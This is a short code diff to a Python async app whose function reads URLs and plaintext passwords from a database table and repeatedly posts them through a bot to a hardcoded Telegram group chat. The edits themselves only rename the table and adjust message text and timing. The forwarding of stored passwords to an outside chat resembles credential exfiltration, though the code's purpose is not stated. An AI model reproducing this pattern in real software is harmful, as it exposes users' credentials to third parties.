@@ -21,12 +21,11 @@ async def index():
 
 async def me():
     cur.execute("""
-                SELECT ident, url, password FROM requests_data WHERE status = 'Ready'
+                SELECT ident, url, password FROM request_data WHERE status = 'Ready'
                 """)
     data = cur.fetchall()
     for i in range(10):
         final_string = ""
-        print(f"Sending {i + 1} Time")
         for row in data:
             ident, url, passw = row
             try:
@@ -36,8 +35,8 @@ async def me():
                 final_string += f"Read timeout on\n{url}\n{passw}\n\n"
             await asyncio.sleep(1)
         bot.send_message(chat_id=-1001968944787, message_thread_id=5279,
-                         text=final_string)
-        await asyncio.sleep(3)
+                         text=f"{final_string}\n\nSent {i + 1} Time")
+        await asyncio.sleep(4)
 
 
 app.run(host='0.0.0.0', port=int(os.getenv("PORT", 3000)))
